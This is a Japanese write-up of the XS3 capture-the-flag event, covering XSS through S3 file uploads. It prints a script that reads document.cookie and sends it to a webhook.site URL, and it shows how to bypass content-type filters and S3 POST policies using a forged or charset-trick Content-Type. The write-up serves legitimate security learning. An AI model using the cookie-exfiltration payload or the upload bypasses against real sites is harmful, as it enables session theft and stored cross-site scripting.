---
title: "XS3 Writeup"
id: "XS3-Writeup"
description: "XS3 ChallengeのWriteupです。"
author: "rikoteki"
createdAt: "2024-04-04"
isDraft: true
---

# ToC

2024/3/28 17:00 JST ~ 2024/4/4 16:59 JSTで開催されたXS3に参加させていただいたのでWriteupです。

XSSとS3を題材にしたCTFのようです。

Introduction, Validation Bypass, Logic Bug, Advanced, Specialという難易度(?)設定がありました。

# Introduction

## Welcome Flag

Welcome問題です。

表示されるフラグを提出するのみ。

```
 flag{welcome_2_xs3}
```

## Server Side Upload

Webアプリケーションとクローラーのソースコードが渡されます。

WebアプリケーションはアップロードフォームとクローラーにアクセスさせるURLを報告するフォームがあります。

![image](https://github.com/r1k0t3k1/note/assets/57973603/f6fbfc64-8081-4275-a35b-5ce5e8b37338)

特にソースコードを気にすることもなく下記のようなHTMLをアップロードした後、URLをクローラーに報告すればフラグ付きでアクセスしてくれました。

```html
<html>
  <body>
    <script>
      const c = btoa(document.cookie);
      fetch("https://webhook.site/89fb3de1-73b3-4344-a625-121bbeab850a?rikoteki="+c);
    </script>
  </body>
</html>
```

```
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
```

## Pre Signed Upload

クローラーのソースコードは変更が無いようでWebアプリケーションのソースコードのみが渡されます。

Webアプリケーションの画面も1問目と変わりません。

1問目同様HTMLをアップロードしようとすると拒否されます。

```
Failed to get presigned URL
```

ソースコードを確認すると、`/api/upload`へのリクエストでcontentTypeによるフィルタがあります。

リクエストボディ

```json
{"contentType":"text/html","length":186}
```

ソースコードのフィルタ部分

```typescript
  const allow = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allow.includes(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
```

ただし、このリクエスト後に発生する署名付きURLを使用したアップロード時にはContent-Typeのチェックがされていないので`/api/upload`へのリクエストのcontentTypeを許可されたものに書き換えるだけでアップロードが可能になります。

```
{"contentType":"image/png","length":186}
```

アップロードが成功したら1問目と同様の手順でフラグが取得できます。

```
flag{fc6f76dd4368e888c1bc878b7750b374c891639f}
```

## POST Policy

Webアプリケーションのソースコード有り、クローラーの実装は変更無し、Webアプリケーションの画面も変更はありません。

今回の問題はファイルタイプをクライアント側でも検証している模様。

```
Invalid file type
```

かつ、問題名からもPost Policyを用いてContent-Typeを制限している模様。

ただし、`starts-with`を使用しているので`image`から開始していれば何でも許可される。

```typescript
  const filename = uuidv4();
  const s3 = new S3Client({});
  const { url, fields } = await createPresignedPost(s3, {
    Bucket: process.env.BUCKET_NAME!,
    Key: `upload/${filename}`,
    Conditions: [
      ['content-length-range', 0, 1024 * 1024 * 100],
      ['starts-with', '$Content-Type', 'image'],
    ],
    Fields: {
      'Content-Type': request.body.contentType,
    },
    Expires: 600,
  });
  return reply.header('content-type', 'application/json').send({
    url,
    fields,
  });
```

調べると以下のURLが見つかり、見ていると当問題に使えそうなテクニックが有りました。

https://github.com/BlackFan/content-type-research/blob/master/XSS.md

```
{"contentType":"image/gif;charset=gbk,text/html","length":186}
```

